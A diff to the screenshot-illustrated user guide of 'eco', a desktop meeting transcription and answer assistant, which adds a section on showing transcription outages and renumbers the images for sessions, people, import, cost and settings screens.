@@ -17,7 +17,7 @@ If you are looking for a task rather than a screen, start at
 
 | what | how |
 |---|---|
-| the pictures under `img/`, `01`–`52` | `mise run shots`: writes them from the real overlay, offscreen |
+| the pictures under `img/`, `01`–`53` | `mise run shots`: writes them from the real overlay, offscreen |
 | checking they are still what the window draws | nothing does: there is no `shots:check` (see below) |
 | `img/eco.gif`, the icon | not a screen: drawn by `mise run readme:gif` from `packaging/eco.omapixel` |
 | the window on a real desktop, over a real call | no pictures: none were taken for this page |
@@ -225,6 +225,19 @@ Under 560 px wide the capsule keeps icons only and the language picker moves
 into the details; under 560 px tall the margins tighten and the skill chips
 hide. The window goes down to 240×320.
 
+**When a source's transcription is down**, a line under the capsule says so
+for that source, in amber: `Transcription down · reconnecting`, with the
+provider's reason on hover. eco keeps opening the connection and holds what is
+heard meanwhile (design §5). When a connection takes the audio again the line
+turns green, `Transcription back`, with `· N s of audio lost` when an outage
+outlasted the five minutes eco holds; it goes with the source's next line, or
+ten seconds later. Nothing here is a key or a button. The picture is the live
+session fed one source down and the other back, from
+`scripts/shots/fixtures/outage.json`: the replay transcribes nothing, so no
+provider went down to take it.
+
+![The live session with two lines under the capsule: a grey square, THEM, an amber warning sign and "Transcription down · reconnecting"; a white square, ME, a green check and "Transcription back · 18 s of audio lost"; below them the conversation ends on "Thursday at ten works. I'll book the room."](img/11-live-transcription.png)
+
 | where | key | what it does |
 |---|---|---|
 | conversation | `↑` `↓` `PgUp` `PgDn` | move through lines, notes and answers |
@@ -242,7 +255,7 @@ hide. The window goes down to 240×320.
 
 **SESSIONS**, or `H` on the start screen, or closing a session:
 
-![The sessions list: the masthead "ECO / SESSIONS", HOME, IMPORT and PEOPLE buttons and "8 SESSIONS"; the search field "Search what was said, noted or answered… /"; a line of chips "LIVE 1", "ALL" lit, MEETING, CONVERSATION, OTHER, IDEA, INTERVIEW, a divider, "#Acme" and more tags cut at the edge; under LIVE, "Sprint planning · Meeting · Today 23:39 · 0 min · #Acme" with a green RECORDING dot; then day headings 10 MAR 2025, 07 MAR 2025, 05 MAR 2025, 04 MAR 2025, each row with its title, kind, date, length, tags, people, ENDED and a trash button.](img/11-sessions.png)
+![The sessions list: the masthead "ECO / SESSIONS", HOME, IMPORT and PEOPLE buttons and "8 SESSIONS"; the search field "Search what was said, noted or answered… /"; a line of chips "LIVE 1", "ALL" lit, MEETING, CONVERSATION, OTHER, IDEA, INTERVIEW, a divider, "#Acme" and more tags cut at the edge; under LIVE, "Sprint planning · Meeting · Today 23:39 · 0 min · #Acme" with a green RECORDING dot; then day headings 10 MAR 2025, 07 MAR 2025, 05 MAR 2025, 04 MAR 2025, each row with its title, kind, date, length, tags, people, ENDED and a trash button.](img/12-sessions.png)
 
 The live sessions come first, under LIVE, toned and with a dot before their
 state; the others newest first under their day. Each row is title, kind,
@@ -254,18 +267,18 @@ The chips are one line that scrolls sideways: LIVE, the kinds (only when there
 is more than one), and the tags. A tag's chip, right-clicked (or the menu key),
 renames or deletes it in every session:
 
-![The sessions list filtered by "#Acme", the chip lit, "4 SESSIONS", with a small menu open under the chip offering RENAME and, in red, DELETE.](img/12-sessions-tag.png)
+![The sessions list filtered by "#Acme", the chip lit, "4 SESSIONS", with a small menu open under the chip offering RENAME and, in red, DELETE.](img/13-sessions-tag.png)
 
 Renaming into a tag that exists says the two become one (that dialog is not
 pictured); deleting asks first, saying how many sessions lose it:
 
-![The sessions list dimmed under a DELETE TAG dialog in a red frame: "Delete #Acme? 4 sessions lose it." with CANCEL and, in red, DELETE.](img/13-sessions-tag-delete.png)
+![The sessions list dimmed under a DELETE TAG dialog in a red frame: "Delete #Acme? 4 sessions lose it." with CANCEL and, in red, DELETE.](img/14-sessions-tag-delete.png)
 
 LIVE narrows the list to what is recording now, and says what is transcribing
 it — the model, the language, and `×n` when one transcriber feeds several
 sessions — so a second paid model never runs unseen:
 
-![The sessions list with "LIVE 1" lit: "1 SESSION", a line "TRANSCRIBING whisper-lan · EN", and the one live row, Sprint planning, RECORDING.](img/14-sessions-live.png)
+![The sessions list with "LIVE 1" lit: "1 SESSION", a line "TRANSCRIBING whisper-lan · EN", and the one live row, Sprint planning, RECORDING.](img/15-sessions-live.png)
 
 **This is the only place a live session shows.** Not on the start screen, and
 not in another session's conversation. Opening its row puts it in this window.
@@ -273,11 +286,11 @@ not in another session's conversation. Opening its row puts it in this window.
 The search field searches what was said, noted or answered in every session
 (`/` from anywhere in the list):
 
-![The sessions list searched for "VPN": "1 SESSION", and the one row, Acme onboarding kickoff, ENDED.](img/15-sessions-search.png)
+![The sessions list searched for "VPN": "1 SESSION", and the one row, Acme onboarding kickoff, ENDED.](img/16-sessions-search.png)
 
 A search with nothing behind it says why, and offers the way back:
 
-![The sessions list searched for "quarterly budget": "0 SESSIONS", "No session matches “quarterly budget”." and a CLEAR FILTERS button.](img/16-sessions-empty.png)
+![The sessions list searched for "quarterly budget": "0 SESSIONS", "No session matches “quarterly budget”." and a CLEAR FILTERS button.](img/17-sessions-empty.png)
 
 There is a different sentence for each empty list: `No session recorded yet.`
 on a new machine, `No live session.` under LIVE, `No session matches these
@@ -303,7 +316,7 @@ opened from People (section 9).
 Opening a row puts the session on screen: **the same view as a live one**, with
 one line where the capsule was:
 
-![The stored session "ACME ONBOARDING KICKOFF": a line "MEETING · 10 MAR 2025 14:00 · 00:34:54 · 10 LINES" with REOPEN on the right; then the conversation — SPEAKER 3 in a greenish box, ANA RIBEIRO in a grey one, MARCUS LEE in a yellowish one — an ASK card with the question "What did we agree on the deadline?" in italics and its answer with "first export" and "21st" in bold, a last SPEAKER 3 line; the skill chips and the composer.](img/17-session.png)
+![The stored session "ACME ONBOARDING KICKOFF": a line "MEETING · 10 MAR 2025 14:00 · 00:34:54 · 10 LINES" with REOPEN on the right; then the conversation — SPEAKER 3 in a greenish box, ANA RIBEIRO in a grey one, MARCUS LEE in a yellowish one — an ASK card with the question "What did we agree on the deadline?" in italics and its answer with "first export" and "21st" in bold, a last SPEAKER 3 line; the skill chips and the composer.](img/18-session.png)
 
 That line says when it was, how long, and how much was said, and offers the way
 back into it: REOPEN for an ended session, RESUME for a paused or interrupted
@@ -313,13 +326,13 @@ a question asked afterwards is answered from the stored transcript.
 Each person keeps their colour across sessions; a speaker nobody has named
 (`Speaker 3`) still gets one of their own.
 
-![The same session at 420×480: the line elided to "MEETING · 10 MAR 2025 14:00 · 00:34:5…" with a play icon, the last Marcus Lee line, the ASK card, the last Speaker 3 line, and the composer with icon buttons.](img/18-session-short.png)
+![The same session at 420×480: the line elided to "MEETING · 10 MAR 2025 14:00 · 00:34:5…" with a play icon, the last Marcus Lee line, the ASK card, the last Speaker 3 line, and the composer with icon buttons.](img/19-session-short.png)
 
 # 6. What a session is: the details
 
 `⋯` in the masthead opens the details over the top of the conversation:
 
-![The details panel of Acme onboarding kickoff: "ENDED · 10 MAR 2025 14:00 · 00:34:54 · 10 LINES · 2 ANSWERS · 1 NOTE" with the edit button; the path "/tmp/eco-shots/.local/share/eco/sessions/2025-03-10-140000-acme-onboarding-kickoff.jsonl" and COPY PATH; PEOPLE "Ana Ribeiro, Marcus Lee, Priya Shah" with a + button; SPEAKERS — Speaker 1 → Ana Ribeiro (CLEAR, CHANGE), Me (you) → No one yet (CHANGE), Speaker 2 → Marcus Lee (CLEAR, CHANGE), Speaker 3 → No one yet (CHANGE); TAGS "#Acme ×" "#Q2 ×" and "Add a tag"; CONTEXT with an unlit "resume" chip; "TRANSLATION: OFF"; and COST, COPY VTT and, in red, DELETE.](img/19-session-details.png)
+![The details panel of Acme onboarding kickoff: "ENDED · 10 MAR 2025 14:00 · 00:34:54 · 10 LINES · 2 ANSWERS · 1 NOTE" with the edit button; the path "/tmp/eco-shots/.local/share/eco/sessions/2025-03-10-140000-acme-onboarding-kickoff.jsonl" and COPY PATH; PEOPLE "Ana Ribeiro, Marcus Lee, Priya Shah" with a + button; SPEAKERS — Speaker 1 → Ana Ribeiro (CLEAR, CHANGE), Me (you) → No one yet (CHANGE), Speaker 2 → Marcus Lee (CLEAR, CHANGE), Speaker 3 → No one yet (CHANGE); TAGS "#Acme ×" "#Q2 ×" and "Add a tag"; CONTEXT with an unlit "resume" chip; "TRANSLATION: OFF"; and COST, COPY VTT and, in red, DELETE.](img/20-session-details.png)
 
 Top to bottom: what the session is on one line, with the edit button (title and
 kind; `E`); where its log is, for a stored session; the people in it; who each
@@ -329,23 +342,23 @@ session's DELETE is off.
 
 **The edit button** opens `edit session`, the title and the kind:
 
-![The EDIT SESSION dialog over the dimmed details: TITLE "Acme onboarding kickoff", KIND "Meeting", CANCEL and SAVE.](img/20-session-edit.png)
+![The EDIT SESSION dialog over the dimmed details: TITLE "Acme onboarding kickoff", KIND "Meeting", CANCEL and SAVE.](img/21-session-edit.png)
 
 **PEOPLE `+`** opens the people dialog: those who are in the session because a
 speaker is them (FROM SPEAKERS, and off, with the reason on hover), and under
 ADD SOMEONE those added by hand — Priya Shah here — and everyone else known:
 
-![The PEOPLE IN THIS SESSION dialog: FROM SPEAKERS with Ana Ribeiro and Marcus Lee as dimmed chips; ADD SOMEONE with a field "Add a person by name" and ADD, then chips for Priya Shah (lit, with ×), Chen Wei, Jonas Weber, M. Lee and Sofia Alvarez; CLOSE.](img/21-session-people.png)
+![The PEOPLE IN THIS SESSION dialog: FROM SPEAKERS with Ana Ribeiro and Marcus Lee as dimmed chips; ADD SOMEONE with a field "Add a person by name" and ADD, then chips for Priya Shah (lit, with ×), Chen Wei, Jonas Weber, M. Lee and Sofia Alvarez; CLOSE.](img/22-session-people.png)
 
 **DELETE** asks `Delete <title>?` and says the transcript, answers and voice
 links go for good:
 
-![The DELETE SESSION dialog in a red frame: "Delete Acme onboarding kickoff?" and, in red, "The transcript, answers and voice links will be permanently removed.", with CANCEL and, filled red, DELETE.](img/22-session-delete.png)
+![The DELETE SESSION dialog in a red frame: "Delete Acme onboarding kickoff?" and, in red, "The transcript, answers and voice links will be permanently removed.", with CANCEL and, filled red, DELETE.](img/23-session-delete.png)
 
 **When eco recognises a voice**, the session says so on one line, and REVIEW
 opens the details at the speakers:
 
-![The imported session "RUST MEETUP: ASYNC IN PRACTICE": the line "OTHER · 27 FEB 2025 18:00 · 00:52:00 · 3 LINES · IMPORTED"; a line "1 VOICE GUESS" with REVIEW; the details open, SPEAKERS saying "eco guessed these speakers from their voices. Nothing changes until you confirm.", Speaker 1 → No one yet, and Speaker 2 → "Jonas Weber? · 93%" with CONFIRM lit, CLEAR and CHANGE.](img/23-session-guess.png)
+![The imported session "RUST MEETUP: ASYNC IN PRACTICE": the line "OTHER · 27 FEB 2025 18:00 · 00:52:00 · 3 LINES · IMPORTED"; a line "1 VOICE GUESS" with REVIEW; the details open, SPEAKERS saying "eco guessed these speakers from their voices. Nothing changes until you confirm.", Speaker 1 → No one yet, and Speaker 2 → "Jonas Weber? · 93%" with CONFIRM lit, CLEAR and CHANGE.](img/24-session-guess.png)
 
 The guess is never applied on its own: the speaker's lines read `JONAS WEBER?`
 until CONFIRM, and CLEAR drops it. On a short window the count moves onto the
@@ -354,11 +367,11 @@ details button.
 **TRANSLATION** picks a language for this session only — any of the seventeen eco
 knows but the session's own:
 
-![The details of Acme onboarding kickoff with the TRANSLATION menu open over them: OFF marked, then PT · português, ES · español de España, FR · français, DE · Deutsch, IT · italiano, NL · Nederlands, PL · polski, RU · русский, UK · українська, TR · Türkçe, cut at the window's edge.](img/24-session-translation.png)
+![The details of Acme onboarding kickoff with the TRANSLATION menu open over them: OFF marked, then PT · português, ES · español de España, FR · français, DE · Deutsch, IT · italiano, NL · Nederlands, PL · polski, RU · русский, UK · українська, TR · Türkçe, cut at the window's edge.](img/25-session-translation.png)
 
 From then on every line and answer carries its translation under it:
 
-![The stored session "REVISIÓN DE PRECIOS": Sofia Alvarez's and the user's lines in Spanish, each with its English translation in italics under it, and an ASK card "¿Qué falta decidir?" answered in Spanish with the English under it.](img/25-session-translated.png)
+![The stored session "REVISIÓN DE PRECIOS": Sofia Alvarez's and the user's lines in Spanish, each with its English translation in italics under it, and an ASK card "¿Qué falta decidir?" answered in Spanish with the English under it.](img/26-session-translated.png)
 
 The model that translates is chosen in Settings › Translation; whether a
 session translates is chosen only here.
@@ -369,7 +382,7 @@ The SPEAKERS list of the details is the one place in the window that says who
 each speaker is. CHANGE on a speaker, or clicking a speaker's name in the
 conversation (`N` on a line), asks:
 
-![The "assign person" dialog over the details: APPLY TO with THIS SPEAKER lit and, in orange, "2 lines will change"; WHO THIS IS with "Tom Becker" typed; a SPEAKER COLOR swatch; KNOWN PEOPLE chips — Ana Ribeiro, Chen Wei, Jonas Weber, M. Lee, Marcus Lee, Priya Shah, Sofia Alvarez; CANCEL and SAVE.](img/26-session-speaker.png)
+![The "assign person" dialog over the details: APPLY TO with THIS SPEAKER lit and, in orange, "2 lines will change"; WHO THIS IS with "Tom Becker" typed; a SPEAKER COLOR swatch; KNOWN PEOPLE chips — Ana Ribeiro, Chen Wei, Jonas Weber, M. Lee, Marcus Lee, Priya Shah, Sofia Alvarez; CANCEL and SAVE.](img/27-session-speaker.png)
 
 It offers the people the voice suggests first, with their score when the
 session kept one, then everyone known, then a new name. It says how many lines
@@ -383,7 +396,7 @@ has warns and offers to merge the two. **A person id is never on screen.**
 
 **COST** in the details, and only there:
 
-![The cost screen: masthead "ECO / COST · ACME ONBOARDING KICKOFF", a SESSION back button and "TOTAL US$ 0.27"; "LLM US$ 0.00068 answers US$ 0.00068" and "TRANSCRIPTION US$ 0.27 (35 MIN)"; then three rows: "Transcription · 35 min, 14:34 · deepgram, US$ 0.27"; "Answer · What did we agree on the deadline?, 14:02 · google/gemini-2.5-flash, US$ 0.00027"; "Answer · reply, 14:00 · google/gemini-2.5-flash, US$ 0.00041".](img/27-session-cost.png)
+![The cost screen: masthead "ECO / COST · ACME ONBOARDING KICKOFF", a SESSION back button and "TOTAL US$ 0.27"; "LLM US$ 0.00068 answers US$ 0.00068" and "TRANSCRIPTION US$ 0.27 (35 MIN)"; then three rows: "Transcription · 35 min, 14:34 · deepgram, US$ 0.27"; "Answer · What did we agree on the deadline?, 14:02 · google/gemini-2.5-flash, US$ 0.00027"; "Answer · reply, 14:00 · google/gemini-2.5-flash, US$ 0.00041".](img/28-session-cost.png)
 
 The total, the LLM part split into answers, reviews and translations, and the
 transcription with its minutes; then every charge, what it was for, when, which
@@ -392,7 +405,7 @@ shows as `?` and a few words, with its reason said once in full above; a total
 that leaves one out reads `≥`; and a figure estimated from a price per minute is
 marked `≈`:
 
-![The cost screen of "Northwind backend interview": "TOTAL ≥ US$ 0.35"; "LLM US$ ? answers US$ ?" and "TRANSCRIPTION US$ 0.35 (45 MIN)"; in amber, "A provider reported no cost for some calls."; "≈ estimated at the price per minute you set for the model."; then "Transcription · 45 min, 09:45 · deepgram, ≈ US$ 0.35" and "Answer · reply, 09:00 · google/gemini-2.5-flash, ? not reported" in amber.](img/28-session-cost-unknown.png)
+![The cost screen of "Northwind backend interview": "TOTAL ≥ US$ 0.35"; "LLM US$ ? answers US$ ?" and "TRANSCRIPTION US$ 0.35 (45 MIN)"; in amber, "A provider reported no cost for some calls."; "≈ estimated at the price per minute you set for the model."; then "Transcription · 45 min, 09:45 · deepgram, ≈ US$ 0.35" and "Answer · reply, 09:00 · google/gemini-2.5-flash, ? not reported" in amber.](img/29-session-cost-unknown.png)
 
 On a live session the screen follows the spending while open. SESSION or `Esc`
 goes back.
@@ -404,13 +417,13 @@ answer cards and the masthead never carry it.
 
 **PEOPLE**, or `P` on the start screen:
 
-![The people screen: masthead "ECO / PEOPLE", a SESSIONS back button, "7 PEOPLE" and ADD; seven rows, each a name in the person's colour with "n voices · n sessions" — Ana Ribeiro (selected, outlined), Chen Wei, Jonas Weber, M. Lee, Marcus Lee, Priya Shah with 0 voices, Sofia Alvarez — and on the right of each a colour swatch, rename, merge and forget buttons.](img/29-people.png)
+![The people screen: masthead "ECO / PEOPLE", a SESSIONS back button, "7 PEOPLE" and ADD; seven rows, each a name in the person's colour with "n voices · n sessions" — Ana Ribeiro (selected, outlined), Chen Wei, Jonas Weber, M. Lee, Marcus Lee, Priya Shah with 0 voices, Sofia Alvarez — and on the right of each a colour swatch, rename, merge and forget buttons.](img/30-people.png)
 
 Everyone eco knows, with how many voices it keeps for them and how many sessions
 they are in. Opening a person goes to SESSIONS filtered to them, with the
 person's chip first among the filters; its × drops it:
 
-![The sessions list filtered to a person: a lit chip "PERSON: Ana Ribeiro ×" before LIVE 1, ALL and the kinds; "2 SESSIONS"; Acme onboarding kickoff and Weekly sync.](img/30-people-sessions.png)
+![The sessions list filtered to a person: a lit chip "PERSON: Ana Ribeiro ×" before LIVE 1, ALL and the kinds; "2 SESSIONS"; Acme onboarding kickoff and Weekly sync.](img/31-people-sessions.png)
 
 Each row
 changes the person's colour, renames them in every session, merges them, or
@@ -421,17 +434,17 @@ SESSIONS.
 the one way out besides `Esc` while it waits; picking the same person says so.
 Picking Marcus Lee asks which name stays:
 
-![The people screen dimmed, a NOTICE "Who else is M. Lee? Pick that person to merge them." with CANCEL at the top, and over it the "merge people" dialog in a red frame: "Merge M. Lee into Marcus Lee? M. Lee's voices and sessions move to Marcus Lee; the name Marcus Lee stays." with SWAP on the left and CANCEL and MERGE on the right.](img/31-people-merge.png)
+![The people screen dimmed, a NOTICE "Who else is M. Lee? Pick that person to merge them." with CANCEL at the top, and over it the "merge people" dialog in a red frame: "Merge M. Lee into Marcus Lee? M. Lee's voices and sessions move to Marcus Lee; the name Marcus Lee stays." with SWAP on the left and CANCEL and MERGE on the right.](img/32-people-merge.png)
 
 SWAP turns the direction around. **FORGET** asks too, saying which voices are
 deleted — eco will not recognise them again — and that the sessions keep the
 name:
 
-![The FORGET PERSON dialog in a red frame over the dimmed people screen: "Forget Ana Ribeiro?" and, in red, "The 2 voices kept for Ana Ribeiro are deleted: eco will not recognise them again. The 2 sessions keep the name Ana Ribeiro.", with CANCEL and, filled red, FORGET.](img/32-people-forget.png)
+![The FORGET PERSON dialog in a red frame over the dimmed people screen: "Forget Ana Ribeiro?" and, in red, "The 2 voices kept for Ana Ribeiro are deleted: eco will not recognise them again. The 2 sessions keep the name Ana Ribeiro.", with CANCEL and, filled red, FORGET.](img/33-people-forget.png)
 
 **ADD** adds somebody by a name nobody has:
 
-![The "add person" dialog over the dimmed people screen: NAME "Tom Becker", CANCEL and ADD.](img/33-people-add.png)
+![The "add person" dialog over the dimmed people screen: NAME "Tom Becker", CANCEL and ADD.](img/34-people-add.png)
 
 A name somebody already has is refused in the dialog. With nobody known, the
 list says `No one yet. Name a live speaker or add someone to a session.` and
@@ -451,26 +464,28 @@ offers ADD. Below 420 px wide a row's four buttons fold into one `⋯` menu.
 **IMPORT**, or `I` on the start screen or in SESSIONS, or dropping a file on the
 window:
 
-![The "import a recording" dialog over the dimmed sessions list: FILE "/tmp/eco-shots/recordings/sprint-retro.vtt" with BROWSE; TITLE "Sprint retro"; KIND "Meeting", LANGUAGE "EN · American English" and SPOKEN BY "Me" dropdowns; CANCEL and IMPORT.](img/34-import.png)
+![The "import a recording" dialog over the dimmed sessions list: FILE "/tmp/eco-shots/recordings/sprint-retro.vtt" with BROWSE; TITLE "Sprint retro"; KIND "Meeting", LANGUAGE "EN · American English" and SPOKEN BY "Me" dropdowns; CANCEL and IMPORT.](img/35-import.png)
 
 Any file `ffmpeg` decodes is transcribed into a new session; a WebVTT
 transcript, like this one, becomes a session as it is, with no transcription.
 BROWSE opens the file dialog; importing with no file says one is needed. SPOKEN
 BY is the audio source the lines start as; a transcript that names its
 speakers keeps them. While it runs, a strip on the start screen and in
-SESSIONS shows the progress, and its × stops it; what was transcribed stays:
+SESSIONS shows the progress, and its × stops it; what was transcribed stays.
+A streaming transcription that goes down meanwhile is said under the strip,
+as in a live session (section 3):
 
-![The sessions list with a strip above the filters: IMPORTING, "Sprint retro", a fill across 62% of the strip, "62%" and a × button.](img/35-import-progress.png)
+![The sessions list with a strip above the filters: IMPORTING, "Sprint retro", a fill across 62% of the strip, "62%" and a × button.](img/36-import-progress.png)
 
 # 11. Finding your way around
 
 `?` or `F1` lists every key, by where it works:
 
-![The keyboard shortcuts dialog over the sessions list: EVERYWHERE (Tab · Shift+Tab, Enter · Space, Esc, ? · F1), GLOBAL (HYPRLAND) (SUPER+ALT+N new session, SUPER+ALT+H sessions, SUPER+ALT+C settings, SUPER+ALT+P pause or resume, SUPER+ALT+E bring eco to the front, SUPER+ALT+1 · 2 run the skills bound in Hyprland), START SCREEN (N, H, I, P), SESSIONS AND PEOPLE (↑ · ↓, Enter, Delete, I, /) and the top of TAG CHIP IN SESSIONS (F2 rename the tag in every session), cut at the bottom edge.](img/36-shortcuts.png)
+![The keyboard shortcuts dialog over the sessions list: EVERYWHERE (Tab · Shift+Tab, Enter · Space, Esc, ? · F1), GLOBAL (HYPRLAND) (SUPER+ALT+N new session, SUPER+ALT+H sessions, SUPER+ALT+C settings, SUPER+ALT+P pause or resume, SUPER+ALT+E bring eco to the front, SUPER+ALT+1 · 2 run the skills bound in Hyprland), START SCREEN (N, H, I, P), SESSIONS AND PEOPLE (↑ · ↓, Enter, Delete, I, /) and the top of TAG CHIP IN SESSIONS (F2 rename the tag in every session), cut at the bottom edge.](img/37-shortcuts.png)
 
 The dialog scrolls (arrows, `PgUp`, `PgDn`). Its end:
 
-![The keyboard shortcuts dialog scrolled to its end: the rest of PEOPLE SCREEN (F2 rename, M merge), STORED SESSION (R resume or reopen, E edit title and kind), CONVERSATION (↑ · ↓ · PgUp · PgDn, Home · End, N, Tab), QUESTION BOX (Enter, Shift+Enter, / with ↑ · ↓, Tab and Enter, Alt+1…9), MENUS AND OPTION LISTS (↑ · ↓ · Home · End, Enter · Space, Esc) and SETTINGS (Ctrl+1…8, Ctrl+S, Alt+↑ · Alt+↓, Esc).](img/37-shortcuts-end.png)
+![The keyboard shortcuts dialog scrolled to its end: the rest of PEOPLE SCREEN (F2 rename, M merge), STORED SESSION (R resume or reopen, E edit title and kind), CONVERSATION (↑ · ↓ · PgUp · PgDn, Home · End, N, Tab), QUESTION BOX (Enter, Shift+Enter, / with ↑ · ↓, Tab and Enter, Alt+1…9), MENUS AND OPTION LISTS (↑ · ↓ · Home · End, Enter · Space, Esc) and SETTINGS (Ctrl+1…8, Ctrl+S, Alt+↑ · Alt+↓, Esc).](img/38-shortcuts-end.png)
 
 The GLOBAL keys are not the window's: `packaging/hypr/eco.lua` binds them in
 Hyprland to `eco window` commands; those that open a view ask the daemon to
@@ -497,21 +512,21 @@ depends on another only reads it.
 
 **Audio** — who is heard, and through what:
 
-![Settings, 01 AUDIO: AUDIO SOURCES with REFRESH; a card "Me" marked YOU with "MIC Default microphone" and ADD DEVICE; a card "Them" with THIS IS ME and "OUT Default output" and ADD DEVICE; a field "new audio source, e.g. Recruiter" with +; then YOUR MICROPHONE with DROP ECHOES lit and ECHO CANCELLATION unlit, each with what it does; CLOSE, DISCARD and SAVE at the bottom.](img/38-settings-audio.png)
+![Settings, 01 AUDIO: AUDIO SOURCES with REFRESH; a card "Me" marked YOU with "MIC Default microphone" and ADD DEVICE; a card "Them" with THIS IS ME and "OUT Default output" and ADD DEVICE; a field "new audio source, e.g. Recruiter" with +; then YOUR MICROPHONE with DROP ECHOES lit and ECHO CANCELLATION unlit, each with what it does; CLOSE, DISCARD and SAVE at the bottom.](img/39-settings-audio.png)
 
 One card per source: its name, whether it is the user, and its PipeWire devices
 with their colour and kind. Each device also carries a live trace and is marked
 when missing; under `--replay` the daemon lists no devices, so the picture has
 neither. ADD DEVICE lists every device, and who has it now:
 
-![The Audio tab with the ADD DEVICE menu of "Them" open: "MIC Default microphone · Me" marked, then "MIC H390 headset microphone", "OUT H390 headset" and "MIC Built-in microphone".](img/39-settings-audio-device.png)
+![The Audio tab with the ADD DEVICE menu of "Them" open: "MIC Default microphone · Me" marked, then "MIC H390 headset microphone", "OUT H390 headset" and "MIC Built-in microphone".](img/40-settings-audio-device.png)
 
 A device has one owner: picking one that another source has moves it here. Removing a
 source asks first, naming who is no longer heard.
 
 **Models** — every model, registered once:
 
-![Settings, 02 MODELS: "Register each model once — chat or transcription — with its provider…"; four closed cards: whisper-lan (TRANSCRIPTION · whisper-large-v3-turbo · used by DEFAULT TRANSCRIPTION, MEETING, CONVERSAT…), deepgram (TRANSCRIPTION · nova-3 · used by INTERVIEW, with ×), gemini-flash (CHAT · google/gemini-2.5-flash · used by ASSISTANT, TRANSLATION, MEETING, MEETING TRANSLAT…), claude-haiku (CHAT · anthropic/claude-haiku-4.5 · used by minutes, with ×); ADD MODEL.](img/40-settings-models.png)
+![Settings, 02 MODELS: "Register each model once — chat or transcription — with its provider…"; four closed cards: whisper-lan (TRANSCRIPTION · whisper-large-v3-turbo · used by DEFAULT TRANSCRIPTION, MEETING, CONVERSAT…), deepgram (TRANSCRIPTION · nova-3 · used by INTERVIEW, with ×), gemini-flash (CHAT · google/gemini-2.5-flash · used by ASSISTANT, TRANSLATION, MEETING, MEETING TRANSLAT…), claude-haiku (CHAT · anthropic/claude-haiku-4.5 · used by minutes, with ×); ADD MODEL.](img/41-settings-models.png)
 
 A closed card is its type, the provider's id and what uses it. Open, it edits
 the provider, the model, where the key comes from (an environment variable or
@@ -519,7 +534,7 @@ an omapass password), reasoning and extra JSON for chat. Without omapass on the
 machine, as in these pictures, **OMAPASS** is off and an info button beside it
 opens omapass's install page:
 
-![The gemini-flash card open: "used by ASSISTANT, TRANSLATION, MEETING, MEETING TRANSLATION, …" in full; NAME "gemini-flash"; REASONING with PROVIDER'S, OFF (lit), LOW, MEDIUM, HIGH; PROVIDER with OPENROUTER (lit), GROQ, CUSTOM; MODEL "google/gemini-2.5-flash" with LIST; KEY FROM with ENV (lit) and OMAPASS, and "OPENROUTER_API_KEY"; ADVANCED; the closed claude-haiku card below.](img/41-settings-model.png)
+![The gemini-flash card open: "used by ASSISTANT, TRANSLATION, MEETING, MEETING TRANSLATION, …" in full; NAME "gemini-flash"; REASONING with PROVIDER'S, OFF (lit), LOW, MEDIUM, HIGH; PROVIDER with OPENROUTER (lit), GROQ, CUSTOM; MODEL "google/gemini-2.5-flash" with LIST; KEY FROM with ENV (lit) and OMAPASS, and "OPENROUTER_API_KEY"; ADVANCED; the closed claude-haiku card below.](img/42-settings-model.png)
 
  The assistant's and
 the default transcription have no ×; removing another asks first, saying what
@@ -527,37 +542,37 @@ falls back to which model.
 
 **Transcription** — the default transcriber and the spoken languages:
 
-![Settings, 03 TRANSCRIPTION: MODEL with DEFAULT MODEL "whisper-lan" and "Transcribes sessions whose kind picks no transcription model"; OFFERED SPOKEN LANGUAGES as numbered rows — AUTO · detect, EN · American English, ES · español de España, PT · português — each with up and × buttons, and ADD; DEFAULT SPOKEN LANGUAGE "EN · American English".](img/42-settings-transcription.png)
+![Settings, 03 TRANSCRIPTION: MODEL with DEFAULT MODEL "whisper-lan" and "Transcribes sessions whose kind picks no transcription model"; OFFERED SPOKEN LANGUAGES as numbered rows — AUTO · detect, EN · American English, ES · español de España, PT · português — each with up and × buttons, and ADD; DEFAULT SPOKEN LANGUAGE "EN · American English".](img/43-settings-transcription.png)
 
 **Answers** — the assistant, its rules, and what it is told:
 
-![Settings, 04 ANSWERS: MODEL with DEFAULT MODEL "gemini-flash"; RULES FOR EVERY ANSWER, four lines of rules; CONTEXT with GLOBAL CONTEXT · ALWAYS SENT "~/notes/about-me.md", a "path to a text file" field with folder and + buttons, CONTEXT SLOTS with a closed "resume · 1 file" card and ADD CONTEXT SLOT, cut at the bottom.](img/43-settings-answers.png)
+![Settings, 04 ANSWERS: MODEL with DEFAULT MODEL "gemini-flash"; RULES FOR EVERY ANSWER, four lines of rules; CONTEXT with GLOBAL CONTEXT · ALWAYS SENT "~/notes/about-me.md", a "path to a text file" field with folder and + buttons, CONTEXT SLOTS with a closed "resume · 1 file" card and ADD CONTEXT SLOT, cut at the bottom.](img/44-settings-answers.png)
 
 The page scrolls: below the slots are the reviewer (on, verbose, its model and
 prompt) and the limits — context size and how many answers run at once, across
 all sessions:
 
-![The Answers tab scrolled to its end: GLOBAL CONTEXT · ALWAYS SENT and CONTEXT SLOTS; 04 REVIEWER, "A second model rewrites every answer before you see it…", with a "Review answers" switch off; 05 LIMITS with MAXIMUM CONTEXT (CHARACTERS) 60000 and ANSWERS RUNNING AT THE SAME TIME, ALL SESSIONS 8.](img/44-settings-answers-end.png)
+![The Answers tab scrolled to its end: GLOBAL CONTEXT · ALWAYS SENT and CONTEXT SLOTS; 04 REVIEWER, "A second model rewrites every answer before you see it…", with a "Review answers" switch off; 05 LIMITS with MAXIMUM CONTEXT (CHARACTERS) 60000 and ANSWERS RUNNING AT THE SAME TIME, ALL SESSIONS 8.](img/45-settings-answers-end.png)
 
 **Skills** — what the composer's chips do:
 
-![Settings, 05 SKILLS: three cards — reply "default · gemini-flash · HOOK · ON SEND", minutes "claude-haiku", explain "default · gemini-flash" — each with up, down and × buttons; ADD SKILL.](img/45-settings-skills.png)
+![Settings, 05 SKILLS: three cards — reply "default · gemini-flash · HOOK · ON SEND", minutes "claude-haiku", explain "default · gemini-flash" — each with up, down and × buttons; ADD SKILL.](img/46-settings-skills.png)
 
 The order here is the order of the chips and of `Alt+1…9`. A skill with no
 model of its own names the one it inherits. Open, a card edits the name, the
 prompt, the format, the model and its hook:
 
-![The reply card open: NAME "reply"; PROMPT and OUTPUT FORMAT as text areas; MODEL "default · gemini-flash"; HOOK "~/bin/post-to-notes" with what the command is run with; SEND ON ITS OWN, off.](img/46-settings-skill.png)
